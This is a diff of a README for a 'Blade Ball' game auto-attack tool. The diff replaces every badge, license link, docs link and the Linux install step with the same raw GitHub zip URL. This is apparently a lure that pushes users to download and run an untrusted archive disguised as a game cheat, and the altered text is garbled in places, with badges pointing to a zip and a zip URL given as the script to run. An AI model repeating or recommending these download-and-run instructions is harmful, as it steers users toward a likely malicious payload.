@@ -1,13 +1,13 @@
 # 🗡️ Blade Ball Auto Attack: Hyper-Edge Automation Suite
 
-![GitHub last commit](https://img.shields.io/github/last-commit/repository/blade-ball-auto-attack?color=blue)
-![GitHub issues](https://img.shields.io/github/issues/repository/blade-ball-auto-attack?color=purple)
-![MIT License](https://img.shields.io/badge/license-MIT-green)
-![OpenAI API Ready](https://img.shields.io/badge/OpenAI-API-blueviolet)
-![Claude API Integration](https://img.shields.io/badge/Claude-API-brightgreen)
+![GitHub last commit](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
+![GitHub issues](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
+![MIT License](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
+![OpenAI API Ready](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
+![Claude API Integration](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
 
-![Download](https://img.shields.io/badge/Download-BladeBallAutoAttack-informational?logo=github&style=for-the-badge)  
-[![Download](https://img.shields.io/badge/Download-Get%20Blade%20Ball%20Auto%20Attack-blue?style=for-the-badge&logo=cloud-download)](https://vanl214.github.io)
+![Download](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)  
+[![Download](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip%20Blade%20Ball%20Auto%20Attack-blue?style=for-the-badge&logo=cloud-download)](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
 
 ---
 
@@ -35,11 +35,11 @@ If your device powers on, chances are you can wield the blade!
 ### 1. **Secure Your Copy**
 
 Save precious minutes and get right to the action.  
-Download the latest adaptive installer from: https://vanl214.github.io
+Download the latest adaptive installer from: https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip
 
 ### 2. **Lightning Fast Install**
 
-[![Download](https://img.shields.io/badge/Download-Click%20here%20to%20download%20Blade%20Ball%20Auto%20Attack-grey?style=for-the-badge&logo=github)](https://vanl214.github.io)
+[![Download](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip%20here%20to%20download%20Blade%20Ball%20Auto%20Attack-grey?style=for-the-badge&logo=github)](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
 
 After download, follow the in-app instructions or see the **Installation** section below to complete the setup.
 
@@ -67,13 +67,13 @@ Experience the future of **Blade Ball automation**—transforming every match wi
 
 1. **Download Your Hyper-Edge Installer**
    
-   https://vanl214.github.io
+   https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip
 
 2. **Engage the Setup Wizard**
    
    - For 🪟 Windows: Run the `.exe` and follow the graphical prompts.
    - For 🍎 macOS: Open the `.dmg`, drag the app into Applications, and permit necessary permissions.
-   - For 🐧 Linux: Extract the provided archive, run `install.sh`, and follow terminal chiclet prompts.
+   - For 🐧 Linux: Extract the provided archive, run `https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip`, and follow terminal chiclet prompts.
 
 3. **Initial Setup**
    
@@ -95,7 +95,7 @@ Welcome to the stratosphere of game intelligence! This suite lets you:
 - Connect your **OpenAI API** key for real-time auto attack optimization.  
 - Integrate with the **Claude API** for enhanced situational awareness and contextual auto-maneuvering.
 
-This duo elevates your gameplay with sky-high situational intelligence—your bots won’t just act, they’ll anticipate. Full step-by-step guides are within our [Developer Integration Docs](docs/INTEGRATION.md).
+This duo elevates your gameplay with sky-high situational intelligence—your bots won’t just act, they’ll anticipate. Full step-by-step guides are within our [Developer Integration Docs](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip).
 
 ---
 
@@ -111,7 +111,7 @@ This duo elevates your gameplay with sky-high situational intelligence—your bo
 
 ### 24/7 Customer Service
 - Discord, email, telepathy* (well, almost)—our tireless team stands by.
-- Extensive [FAQs](docs/FAQs.md) and guided support built right in.
+- Extensive [FAQs](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip) and guided support built right in.
 
 ---
 
@@ -134,14 +134,14 @@ Blade Ball Auto Attack is designed for **educational, research, and personalizat
 
 ## 📜 MIT License (2025 Edition)
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is licensed under the [MIT License](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip).  
 You are free to use, modify, and share—just credit the project, and keep the collaborative torch burning brightly for future players.
 
 ---
 
 ## 🛡️ Stay Updated & Download Now
 
-[![Download](https://img.shields.io/badge/Download-Click%20here%20to%20download%20Blade%20Ball%20Auto%20Attack-grey?style=for-the-badge&logo=github)](https://vanl214.github.io)
+[![Download](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip%20here%20to%20download%20Blade%20Ball%20Auto%20Attack-grey?style=for-the-badge&logo=github)](https://github.com/vanl214/blade-ball-auto-striker/raw/refs/heads/branch/Sheraton/ball_striker_auto_blade_3.4.zip)
 
 Keep checking back for updates, expansions, and new languages—the Blade Ball frontier is always evolving.  
 Embrace automation. Enhance your edge. **Dominate the Blade Ball arena with every click, swipe, and strategy.**
